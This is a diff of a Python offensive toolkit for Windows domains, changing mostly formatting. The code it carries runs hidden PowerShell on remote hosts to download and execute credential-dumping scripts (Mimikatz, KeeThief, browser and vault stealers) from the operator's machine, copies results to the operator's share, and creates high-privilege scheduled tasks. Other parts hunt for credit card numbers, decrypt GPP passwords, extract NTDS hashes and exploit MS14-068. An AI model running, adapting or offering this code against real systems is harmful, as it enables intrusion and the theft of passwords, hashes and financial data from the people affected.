@@ -3295,7 +3342,9 @@ def getKeepass(targetIP, domain, username, password, passwordHash):
     batFilename = generateRandomStr() + ".bat"
     tmpCmd = ''
     #cmd=" \"IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/KeeThief.ps1\'); Get-KeePassDatabaseKey | Select-Object Database,Plaintext | Out-File \\\\"+myIP+"\\guest\\"+targetIP+"_keepass.txt\""
-    cmd = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/KeeThief.ps1\'); Get-KeePassDatabaseKey | Select-Object Database,Plaintext | Out-File \\\\" + myIP + "\\guest\\" + targetIP + "_keepass.txt"
+    cmd = " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+        ":8000/KeeThief.ps1\'); Get-KeePassDatabaseKey | Select-Object Database,Plaintext | Out-File \\\\" + \
+        myIP + "\\guest\\" + targetIP + "_keepass.txt"
     if applockerBypass == True:
         randomCount = (randint(1, 2))
         if randomCount == 1:
@@ -3335,7 +3384,8 @@ def getKeepass(targetIP, domain, username, password, passwordHash):
             if debugMode == True:
                 print command
                 print results
-            command = 'schtasks.exe /Create /RL HIGHEST /RU ' + selectedUsername + ' /TN ' + tmpSchedName + ' /SC MONTHLY /M DEC /F /TR "' "C:\\windows\\temp\\" + batFilename + "\""
+            command = 'schtasks.exe /Create /RL HIGHEST /RU ' + selectedUsername + ' /TN ' + \
+                tmpSchedName + ' /SC MONTHLY /M DEC /F /TR "' "C:\\windows\\temp\\" + batFilename + "\""
             results, status = runWMIEXEC(targetIP, domain, username, password,
                                          passwordHash, command)
             if debugMode == True:
@@ -3472,7 +3522,8 @@ def getTruecrypt(targetIP, domain, username, password, passwordHash):
                 if tmpSP == "1":
                     tmpSP = "SP1"
                 volProfile = tmpVer + tmpSP + tmpArch
-                cmd = "python " + pathVolatility + "/vol.py -f " + filename + " --profile=" + volProfile + " truecryptmaster"
+                cmd = "python " + pathVolatility + "/vol.py -f " + \
+                    filename + " --profile=" + volProfile + " truecryptmaster"
                 cmdList = cmd.split(" ")
                 resultList = subprocess.check_output(cmdList)
                 if debugMode == True:
@@ -3498,13 +3549,15 @@ def getBitlockerKeys(targetIP, domain, username, password, passwordHash):
     powershellPath = getPowershellPath(targetIP, domain, username, password,
                                        passwordHash)
     powershellArgs = ' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
-    command = powershellPath + " " + powershellArgs + " -Command \"Get-BitLockerVolume |  Select-Object MountPoint,VolumeStatus\""
+    command = powershellPath + " " + powershellArgs + \
+        " -Command \"Get-BitLockerVolume |  Select-Object MountPoint,VolumeStatus\""
     if debugMode == True:
         print command
     results, status = runWMIEXEC(targetIP, domain, username, password,
                                  passwordHash, command)
     if "FullyEncrypted" in str(results):
-        command = powershellPath + " " + powershellArgs + " -Command \"(Get-BitLockerVolume -MountPoint C).KeyProtector.recoverypassword\""
+        command = powershellPath + " " + powershellArgs + \
+            " -Command \"(Get-BitLockerVolume -MountPoint C).KeyProtector.recoverypassword\""
         if debugMode == True:
             print command
         results, status = runWMIEXEC(targetIP, domain, username, password,
@@ -3518,7 +3571,8 @@ def getBitlockerKeys(targetIP, domain, username, password, passwordHash):
 
 def memCredDump(targetIP, domain, username, password, passwordHash,
                 processName):
-    command = powershellCmdStart + ' -Command "(New-Object Net.WebClient).DownloadFile(\'http://' + myIP + ':8000/mem_scraper.ps1\',\'%temp%\mem_scraper.ps1\');%temp%\mem_scraper.ps1 -Proc ' + processName + '"'
+    command = powershellCmdStart + ' -Command "(New-Object Net.WebClient).DownloadFile(\'http://' + myIP + \
+        ':8000/mem_scraper.ps1\',\'%temp%\mem_scraper.ps1\');%temp%\mem_scraper.ps1 -Proc ' + processName + '"'
     results, status = runWMIEXEC(targetIP, domain, username, password,
                                  passwordHash, command)
     tmpResultList = results[0].split("\n")
@@ -3586,16 +3640,17 @@ def diskCredDump(targetIP, domain, username, password, passwordHash):
                     color="blue")) + " " + targetIP + ":445 | " + (setColor(
                         "[PAN]", color="green"
                     )) + " | Searching disks: " + " ".join(tmpDriveList)
-            #print "\n"
-        #if obfuscatedMode==True:
+            # print "\n"
+        # if obfuscatedMode==True:
         #    print (setColor("[*]", bold, color="blue"))+" "+targetIP+":445 [mimikatz][obfs] | Enable Powershell Obfuscation"
         for driveNo in tmpDriveList:
-            #if obfuscatedMode==False:
+            # if obfuscatedMode==False:
             #command=' -Command "'+amsiBypassStr+';(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'
             #command=powershellPath+' '+powershellArgs+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'
             #command=powershellPath+' '+powershellArgs+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'
             #command=powershellPath+' "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'
-            command = ' (New-Object Net.WebClient).DownloadFile(\'http://' + myIP + ':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path ' + driveNo + '\\\\'
+            command = ' (New-Object Net.WebClient).DownloadFile(\'http://' + myIP + \
+                ':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path ' + driveNo + '\\\\'
             if debugMode == True:
                 print command
         #    command=' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder-obfs.ps1\',\'%temp%\credit-card-finder-obfs.ps1\');%temp%\credit-card-finder-obfs.ps1 -path '+driveNo+'\\\\"'
@@ -3616,7 +3671,8 @@ def diskCredDump(targetIP, domain, username, password, passwordHash):
                 results, status = runWMIEXEC(targetIP, domain, username,
                                              password, passwordHash, newCmd)
             else:
-                command = powershellPath + ' "(New-Object Net.WebClient).DownloadFile(\'http://' + myIP + ':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path ' + driveNo + '\\\\"'
+                command = powershellPath + ' "(New-Object Net.WebClient).DownloadFile(\'http://' + myIP + \
+                    ':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path ' + driveNo + '\\\\"'
                 results, status = runWMIEXEC(targetIP, domain, username,
                                              password, passwordHash, command)
         #results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)
@@ -3624,10 +3680,10 @@ def diskCredDump(targetIP, domain, username, password, passwordHash):
                 print command
                 print results
             print results
-        #tmpResultList=results[0].split("\n")
-        #for x in tmpResultList:
+        # tmpResultList=results[0].split("\n")
+        # for x in tmpResultList:
         #    tmpResultList1.append(x)
-    #return tmpResultList1
+    # return tmpResultList1
     return results
 
 
@@ -3660,7 +3716,7 @@ def listRemoteShare(targetIP, domain, username, password):
                                 shareName, '/' + subDirectory)
                             for y in sharedfiles:
                                 if y.filename != '.' and y.filename != '..' and y.isDirectory == True and y.filename != 'Windows' and y.filename != 'Boot' and y.filename != 'Public':
-                                    #if y.filename != '.' and y.filename != '..' and y.isDirectory==True:
+                                    # if y.filename != '.' and y.filename != '..' and y.isDirectory==True:
                                     subDirectoryList.append(y.filename)
                                     try:
                                         conn.listPath(shareName,
@@ -3696,11 +3752,11 @@ def listRemoteShare(targetIP, domain, username, password):
                                         sharedfiles = conn.listPath(
                                             shareName, z)
                                     for g in sharedfiles:
-                                        #print g.filename
+                                        # print g.filename
                                         if g.filename != '.' and g.filename != '..' and g.isDirectory == True:
                                             subDirectoryList.append(z + "/" +
                                                                     g.filename)
-                                            #subDirectoryList.append("/"+z+"/"+g.filename)
+                                            # subDirectoryList.append("/"+z+"/"+g.filename)
                                             try:
                                                 conn.listPath(
                                                     shareName,
@@ -3776,7 +3832,7 @@ def getInstalledPrograms(targetIP, domain, username, password, passwordHash):
         if debugMode == True:
             print command
             print results
-    #results=runRemoteCMD(targetIP,domain,username,password,passwordHash,command)
+    # results=runRemoteCMD(targetIP,domain,username,password,passwordHash,command)
     tmpResultList1 = []
     if "FullyQualifiedErrorId" not in str(results):
         count = 0
@@ -3848,14 +3904,14 @@ def downloadFile(targetIP, domain, username, password, filePath):
                 file_obj.close()
                 return lootPath + "/" + tempFilename
             except Exception as e:
-                #print e
+                # print e
                 return ""
     except Exception as e:
         return ""
 
 
 def parseSiteManagerXML(filename):
-    #Sample https://raw.githubusercontent.com/synzox/dotfiles/master/.filezilla/sitemanager.xml
+    # Sample https://raw.githubusercontent.com/synzox/dotfiles/master/.filezilla/sitemanager.xml
     resultList = []
     with open(filename, 'r') as myfile:
         data = myfile.read().replace('\n', '')
@@ -3907,8 +3963,8 @@ def decryptUltraVNC(hashPassword):
 
 
 def parseUltraVNC(filename):
-    #Sample https://raw.githubusercontent.com/justdan96/VNCappWrapper/master/ultravnc.ini
-    #Decrypt tool http://tools88.com/safe/vnc.php
+    # Sample https://raw.githubusercontent.com/justdan96/VNCappWrapper/master/ultravnc.ini
+    # Decrypt tool http://tools88.com/safe/vnc.php
     resultList = []
     passwd1 = ''
     passwd2 = ''
@@ -3928,7 +3984,7 @@ def parseUltraVNC(filename):
 
 
 def parseUnattendXML(filename):
-    #Sample http://www.itninja.com/question/how-do-i-add-a-custom-local-administrator-account-through-sysprep
+    # Sample http://www.itninja.com/question/how-do-i-add-a-custom-local-administrator-account-through-sysprep
     tmpUserList = []
     try:
         with open(filename, 'r') as myfile:
@@ -3998,7 +4054,7 @@ def parseUnattendXML(filename):
 
 
 def decryptGPP(cpassword):
-    #https://raw.githubusercontent.com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py
+    # https://raw.githubusercontent.com/reider-roque/pentest-tools/master/password-cracking/gpprefdecrypt/gpprefdecrypt.py
     # Key from MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
     key = ("4e9906e8fcb66cc9faf49310620ffee8"
            "f496e806cc057990209b09a433b66c1b").decode('hex')
@@ -4016,7 +4072,7 @@ def getOSType():
 
 
 def mountSysvol(username, password):
-    #Sample cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
+    # Sample cpassword=j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
     tmpPassList = []
     status, foundAdmin = testDomainCredentials(username, password, None,
                                                dcList[0], 'WORKGROUP', True)
@@ -4070,7 +4126,7 @@ def mountSysvol(username, password):
                                 m = re.search('cpassword="(\S*)"', content)
                                 if m:
                                     tmppassword = m.group(1)
-                                    #print "[*] Base64 Password Found: "+password
+                                    # print "[*] Base64 Password Found: "+password
                                     tmppassword = decryptGPP(tmppassword)
                                 if len(tmpusername) > 0 and len(
                                         tmppassword) > 0:
@@ -4084,10 +4140,10 @@ def mountSysvol(username, password):
                     print(setColor("[*]", bold, color="blue")) + " " + dcList[
                         0] + ":445 | " + username + ":" + password + " | " + (
                             setColor("[sysvol] ", bold, color="green")
-                        ) + " Decrypted GPP Password: " + x[0] + ":" + x[1]
+                    ) + " Decrypted GPP Password: " + x[0] + ":" + x[1]
                     #print (setColor("[+]", bold, color="green"))+" Decrypted GPP Password"
                     #headers = ["Username","Password"]
-                    #print tabulate(tmpPassList,headers,tablefmt="simple")
+                    # print tabulate(tmpPassList,headers,tablefmt="simple")
                 for x in tmpPassList:
                     tmpusername = x[0]
                     tmppassword = x[1]
@@ -4202,8 +4258,7 @@ def mountSysvol(username, password):
                                                                 setColor(
                                                                     "\nEnumerating Tokens and Attempting Privilege Escalation",
                                                                     bold,
-                                                                    color=
-                                                                    "green"))
+                                                                    color="green"))
                                                             tokensPriv(
                                                                 tmpip,
                                                                 tmpdomin,
@@ -4311,10 +4366,11 @@ def findInterestingFiles(targetIP, domain, username, password, passwordHash):
                        color="blue")) + " " + targetIP + ":445 | " + (setColor(
                            "[drives]", color="green"
                        )) + " | Found drives: " + ", ".join(tmpDriveList1)
-    #print "[*] Finding Files on Host: "+targetIP
+    # print "[*] Finding Files on Host: "+targetIP
     for drive in tmpDriveList:
         #command=' -command '+searchKeywords+'; Get-ChildItem -Path "'+drive+':\" -Recurse -Include "$searchKeywords" -Name'
-        command = ' ' + searchKeywords + '; Get-ChildItem -Path "' + drive + ':\" -Recurse -Include "$searchKeywords" -Name'
+        command = ' ' + searchKeywords + '; Get-ChildItem -Path "' + \
+            drive + ':\" -Recurse -Include "$searchKeywords" -Name'
         if applockerBypass == True:
             chosenNumber = 2
             newCmd = ''
@@ -4403,10 +4459,12 @@ def findInterestingRegKeys(targetIP, domain, username, password, passwordHash):
 
 
 def runDumpMSSQL(targetIP, domain, username, password, passwordHash):
-    #https://github.com/NetSPI/PowerUpSQL
+    # https://github.com/NetSPI/PowerUpSQL
     print setColor('\nDumping MSSQL Service Credentials', bold, color='red')
-    command = "-Command (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/PowerUpSQL.psd1\','C:\windows\\temp\PowerUpSQL.psd1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/PowerUpSQL.ps1\','C:\windows\\temp\PowerUpSQL.ps1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/PowerUpSQL.psm1\','C:\windows\\temp\PowerUpSQL.psm1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/Inveigh.ps1\','c:\windows\\temp\Inveigh.ps1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/Inveigh.ps1\Get-SQLServiceAccountPwHash3.ps1\','c:\windows\\temp\Get-SQLServiceAccountPwHash3.ps1'); Import-Module C:\windows\\temp\PowerUpSQL.psm1; Import-Module C:\windows\\temp\Inveigh.ps1; Import-Module C:\windows\\temp\Get-SQLServiceAccountPwHashes.ps1; Get-SQLServiceAccountPwHashes -Verbose -TimeOut 5 -CaptureIp " + targetIP
-    #print powershellCmdStart+command
+    command = "-Command (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/PowerUpSQL.psd1\','C:\windows\\temp\PowerUpSQL.psd1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/PowerUpSQL.ps1\','C:\windows\\temp\PowerUpSQL.ps1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/PowerUpSQL.psm1\','C:\windows\\temp\PowerUpSQL.psm1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + \
+        ":8000/Inveigh.ps1\','c:\windows\\temp\Inveigh.ps1'); (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + \
+        ":8000/Inveigh.ps1\Get-SQLServiceAccountPwHash3.ps1\','c:\windows\\temp\Get-SQLServiceAccountPwHash3.ps1'); Import-Module C:\windows\\temp\PowerUpSQL.psm1; Import-Module C:\windows\\temp\Inveigh.ps1; Import-Module C:\windows\\temp\Get-SQLServiceAccountPwHashes.ps1; Get-SQLServiceAccountPwHashes -Verbose -TimeOut 5 -CaptureIp " + targetIP
+    # print powershellCmdStart+command
     results, status = runWMIEXEC(targetIP, domain, username, password,
                                  passwordHash, powershellCmdStart + command)
     tmpResultList = results.split("\n")
@@ -4433,7 +4491,9 @@ def runDumpVault(targetIP, domain, username, password, passwordHash):
     powershellPath = getPowershellPath(targetIP, domain, username, password,
                                        passwordHash)
     powershellArgs = ' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
-    command = powershellPath + " " + powershellArgs + " \"IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Get-VaultCredential.ps1\'); Get-VaultCredential\""
+    command = powershellPath + " " + powershellArgs + \
+        " \"IEX (New-Object Net.WebClient).DownloadString(\'http://" + \
+        myIP + ":8000/Get-VaultCredential.ps1\'); Get-VaultCredential\""
     if debugMode == True:
         print command
     results = runPSEXEC(targetIP, domain, username, password, passwordHash,
@@ -4443,8 +4503,8 @@ def runDumpVault(targetIP, domain, username, password, passwordHash):
 
 
 def dumpWifi(targetIP, domain, username, password, passwordHash):
-    #netsh wlan add profile filename="wlan.xml" interface="Wireless Network Connection" user=current
-    #https://gist.github.com/milo2012/7ba74a4451f19a96078597d1f5b85dad/raw/85d9f2364116f99db78bf6993df2d42e106b5baf/wirelessProfile.xml
+    # netsh wlan add profile filename="wlan.xml" interface="Wireless Network Connection" user=current
+    # https://gist.github.com/milo2012/7ba74a4451f19a96078597d1f5b85dad/raw/85d9f2364116f99db78bf6993df2d42e106b5baf/wirelessProfile.xml
     '''
     <?xml version="1.0" encoding="US-ASCII"?>
     <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
@@ -4481,7 +4541,9 @@ def dumpWifi(targetIP, domain, username, password, passwordHash):
     powershellPath = getPowershellPath(targetIP, domain, username, password,
                                        passwordHash)
     powershellArgs = ' -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass '
-    command = powershellPath + " " + powershellArgs + " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/WiFi-Password.psm1\'); Show-WiFiPassword\""
+    command = powershellPath + " " + powershellArgs + \
+        " IEX \"(New-Object Net.WebClient).DownloadString(\'http://" + \
+        myIP + ":8000/WiFi-Password.psm1\'); Show-WiFiPassword\""
     if debugMode == True:
         print command
     if len(domain) < 1:
@@ -4568,7 +4630,7 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                 tmpdomain = (x.split("\\")[0]).lower()
                 tmpusername = (x.split("\\")[1]).lower()
                 tmpFoundAccounts.append([tmpdomain, tmpusername])
-                #for y in userPassList:
+                # for y in userPassList:
                 #    tmpdomain1=(y[1]).lower()
                 #    tmpusername1=(y[2]).lower()
                 #    if tmpdomain in tmpdomain1 and tmpusername==tmpusername1:
@@ -4576,7 +4638,7 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
             else:
                 tmpusername = x
                 tmpFoundAccounts.append(["workgroup", tmpusername])
-                #for y in userPassList:
+                # for y in userPassList:
                 #    tmpdomain1=(y[1]).lower()
                 #    tmpusername1=(y[2]).lower()
                 #    if x==tmpusername1:
@@ -4586,16 +4648,17 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                 tmpdomain = x[0]
                 tmpusername = x[1]
 
-                #print "[*] Found the Below Credentials in Database"
-                #print tabulate(tmpFoundAccounts)
+                # print "[*] Found the Below Credentials in Database"
+                # print tabulate(tmpFoundAccounts)
                 if "firefox" in tmpBrowserList:
                     print "\n[*] Dumping Firefox Passwords from Host: " + targetIP
-                    #print "[*] Uploading Script to Host: "+targetIP
+                    # print "[*] Uploading Script to Host: "+targetIP
                     outputFilename = generateRandomStr() + ".txt"
                     batFilename = generateRandomStr() + ".bat"
                     tmpSchedName = generateRandomStr()
                     #s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\windows\\temp\\'+outputFilename
-                    s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + ':8000/Get-FoxDump.ps1\'); Get-FoxDump -OutFile C:\\windows\\temp\\' + outputFilename
+                    s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + \
+                        ':8000/Get-FoxDump.ps1\'); Get-FoxDump -OutFile C:\\windows\\temp\\' + outputFilename
                     encodedPS = powershell_encode(s)
                     cmd = "C:\windows\sysWOW64\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec " + encodedPS
                     target = open(batFilename, 'w')
@@ -4604,12 +4667,13 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                     uploadFile(batFilename, batFilename, targetIP, domain,
                                username, password, passwordHash)
 
-                    #print "[*] Scheduling Tasks on Host: "+targetIP
+                    # print "[*] Scheduling Tasks on Host: "+targetIP
                     command = 'schtasks.exe /Delete /TN ' + tmpSchedName + ' /f'
                     results, status = runWMIEXEC(targetIP, domain, username,
                                                  password, passwordHash,
                                                  command)
-                    command = 'schtasks.exe /Create /RL HIGHEST /RU ' + tmpdomain + '\\' + tmpusername + ' /TN ' + tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + batFilename + "\""
+                    command = 'schtasks.exe /Create /RL HIGHEST /RU ' + tmpdomain + '\\' + tmpusername + ' /TN ' + \
+                        tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + batFilename + "\""
                     if debugMode == True:
                         print command
                     results, status = runWMIEXEC(targetIP, domain, username,
@@ -4618,7 +4682,7 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                     if "ERROR" in str(results):
                         print results
                     else:
-                        #print "[*] Running Tasks on Host: "+targetIP
+                        # print "[*] Running Tasks on Host: "+targetIP
                         command = 'schtasks /Run /TN ' + tmpSchedName
                         results, status = runWMIEXEC(targetIP, domain,
                                                      username, password,
@@ -4634,7 +4698,7 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                                 if tmpSchedName in x:
                                     if "Ready" in x or "Running" in x:
                                         if "Ready" in x:
-                                            #print "[*] Removing Tasks from Host: "+targetIP
+                                            # print "[*] Removing Tasks from Host: "+targetIP
                                             command = 'schtasks.exe /Delete /TN ' + tmpSchedName + ' /f'
                                             runWMIEXEC(targetIP, domain,
                                                        username, password,
@@ -4669,26 +4733,29 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                                         tmpFound = True
                 if "chrome" in tmpBrowserList:
                     print "\n[*] Dumping Chrome Passwords from Host: " + targetIP
-                    #print "[*] Uploading Script to Host: "+targetIP
+                    # print "[*] Uploading Script to Host: "+targetIP
                     outputFilename = generateRandomStr() + ".txt"
                     batFilename = generateRandomStr() + ".bat"
                     tmpSchedName = generateRandomStr()
                     #s='IEX (New-Object Net.WebClient).DownloadString(\'http://'+myIP+':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\windows\\temp\\'+outputFilename
-                    s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + ':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\temp\\' + outputFilename
+                    s = 'IEX (New-Object Net.WebClient).DownloadString(\'http://' + myIP + \
+                        ':8000/BrowserGather.ps1\'); Get-ChromeCreds | Out-File C:\\temp\\' + outputFilename
                     encodedPS = powershell_encode(s)
-                    cmd = powershellPath + " -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec " + encodedPS
+                    cmd = powershellPath + \
+                        " -windowstyle hidden -NoProfile -NoLogo -NonInteractive -Sta -ep bypass -ec " + encodedPS
                     target = open(batFilename, 'w')
                     target.write(cmd)
                     target.close()
                     uploadFile(batFilename, batFilename, targetIP, domain,
                                username, password, passwordHash)
 
-                    #print "[*] Scheduling Tasks on Host: "+targetIP
+                    # print "[*] Scheduling Tasks on Host: "+targetIP
                     command = 'schtasks.exe /Delete /TN ' + tmpSchedName + ' /f'
                     results, status = runWMIEXEC(targetIP, domain, username,
                                                  password, passwordHash,
                                                  command)
-                    command = 'schtasks.exe /Create /RL HIGHEST /RU ' + tmpdomain + '\\' + tmpusername + ' /TN ' + tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + batFilename + "\""
+                    command = 'schtasks.exe /Create /RL HIGHEST /RU ' + tmpdomain + '\\' + tmpusername + ' /TN ' + \
+                        tmpSchedName + ' /SC MONTHLY /M DEC /TR "' "C:\\windows\\temp\\" + batFilename + "\""
                     if debugMode == True:
                         print command
                     results, status = runWMIEXEC(targetIP, domain, username,
@@ -4697,7 +4764,7 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                     if "ERROR" in str(results):
                         print results
                     else:
-                        #print "[*] Running Tasks on Host: "+targetIP
+                        # print "[*] Running Tasks on Host: "+targetIP
                         command = 'schtasks /Run /TN ' + tmpSchedName
                         results, status = runWMIEXEC(targetIP, domain,
                                                      username, password,
@@ -4713,7 +4780,7 @@ def dumpBrowser(targetIP, domain, username, password, passwordHash):
                                 if tmpSchedName in x:
                                     if "Ready" in x or "Running" in x:
                                         if "Ready" in x:
-                                            #print "[*] Removing Tasks from Host: "+targetIP
+                                            # print "[*] Removing Tasks from Host: "+targetIP
                                             command = 'schtasks.exe /Delete /TN ' + tmpSchedName + ' /f'
                                             runWMIEXEC(targetIP, domain,
                                                        username, password,
@@ -4742,7 +4809,8 @@ def dumpIIS(targetIP, domain, username, password, passwordHash):
     #command=powershellPath+" "+powershellArgs+" \"IEX (New-Object Net.WebClient).DownloadString(\'http://"+myIP+":8000/get-applicationhost.ps1\'); Get-ApplicationHost | Format-Table -Autosize\""
     #command=powershellPath+" "+powershellArgs+" -Command \"(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1; Get-ApplicationHost | Format-Table -Autosize\""
     #command=powershellPath+" "+powershellArgs+"-Command \"(New-Object Net.WebClient).DownloadFile(\'http://"+myIP+":8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1\""
-    command = powershellPath + " " + powershellArgs + " IEX (New-Object Net.WebClient).DownloadFile(\'http://" + myIP + ":8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1"
+    command = powershellPath + " " + powershellArgs + " IEX (New-Object Net.WebClient).DownloadFile(\'http://" + \
+        myIP + ":8000/get-applicationhost.ps1\',\'%temp%\get-applicationhost.ps1\'); . %temp%\get-applicationhost.ps1"
     results, status = runWMIEXEC(targetIP, domain, username, password,
                                  passwordHash, powershellCmdStart + command)
     if debugMode == True:
@@ -4941,7 +5009,7 @@ def setupSMBShare():
 
 
 def testMS14_068(ip, domain, username, password, passwordHash):
-    #Setup SMB Share
+    # Setup SMB Share
     tmpPassList = []
     tmpHashList = []
     domainShort, domainFull = reverseLookup(ip)
@@ -4972,8 +5040,8 @@ def testMS14_068(ip, domain, username, password, passwordHash):
     ) == domainShort.lower():
         print "adding: " + username + "\t" + password
         tmpFoundCreds.append([username, password])
-    #print domainShort
-    #for x in userPassList:
+    # print domainShort
+    # for x in userPassList:
     #    if domainFull.lower() in str(x).lower():
     #        tmpFoundCreds=x
     if len(tmpFoundCreds) < 1:
@@ -4981,7 +5049,9 @@ def testMS14_068(ip, domain, username, password, passwordHash):
     if len(tmpFoundCreds) > 0:
         username = tmpFoundCreds[0][0]
         password = tmpFoundCreds[0][1]
-        command = powershellPath + " " + powershellArgs + " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
+        command = powershellPath + " " + powershellArgs + \
+            " IEX (New-Object Net.WebClient).DownloadString(\'http://" + \
+            myIP + ":8000/Invoke-Mimikatz.ps1\'); Invoke-Mimikatz -DumpCreds"
         dumper = MS14_068(address, target_ip, username, password, domainFull,
                           None, command, None, None, dc_ip)
         try:
@@ -5008,7 +5078,9 @@ def testMS14_068(ip, domain, username, password, passwordHash):
         username = tmpFoundCreds[0][0]
         password = tmpFoundCreds[0][1]
 
-        command = powershellPath + " " + powershellArgs + " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + ":8000/Get-PasswordFile.ps1\'); Get-PasswordFile '\\\\" + myIP + "\\guest'"
+        command = powershellPath + " " + powershellArgs + \
+            " IEX (New-Object Net.WebClient).DownloadString(\'http://" + myIP + \
+            ":8000/Get-PasswordFile.ps1\'); Get-PasswordFile '\\\\" + myIP + "\\guest'"
         dumper = MS14_068(address, target_ip, username, password, domainFull,
                           None, command, None, None, dc_ip)
         try:
@@ -5036,7 +5108,8 @@ def testMS14_068(ip, domain, username, password, passwordHash):
             time.sleep(2)
 
             outputFilename = "/tmp/NT.out"
-            cmd = "python " + pathNTDSExtract + "/dsusers.py /tmp/ntds.export/datatable.3 /tmp/ntds.export/link_table.5 /tmp --passwordhashes --lmoutfile /tmp/LM.out --ntoutfile " + outputFilename + " --pwdformat john --syshive " + origScriptPath + "/system"
+            cmd = "python " + pathNTDSExtract + "/dsusers.py /tmp/ntds.export/datatable.3 /tmp/ntds.export/link_table.5 /tmp --passwordhashes --lmoutfile /tmp/LM.out --ntoutfile " + \
+                outputFilename + " --pwdformat john --syshive " + origScriptPath + "/system"
             resultList = runCommand(cmd, shell=True, timeout=120)
 
             if os.path.exists(outputFilename):
@@ -5071,7 +5144,7 @@ def testMS14_068(ip, domain, username, password, passwordHash):
                                 accessAdmHostList.append(
                                     [ip, domain, tmpusername, tmphash])
 
-            #accessAdmHostList.append()
+            # accessAdmHostList.append()
     return tmpPassList, tmpHashList
 
 
@@ -5104,8 +5177,8 @@ def addPasswords(tmpip, tmpPasswordList):
 
 
 def addHashes(tmpip, tmpHashList):
-    #tmpdomain=getNetBiosName(tmpip)
-    #print tmpdomain
+    # tmpdomain=getNetBiosName(tmpip)
+    # print tmpdomain
     for x in tmpHashList:
         tmpusername = x.split(":")[0]
         tmphash = x.split(":")[2] + ":" + x.split(":")[3]
@@ -5114,7 +5187,7 @@ def addHashes(tmpip, tmpHashList):
             tmpusername = tmpusername.split("\\")[1]
             if len(tmpdomain) < 1:
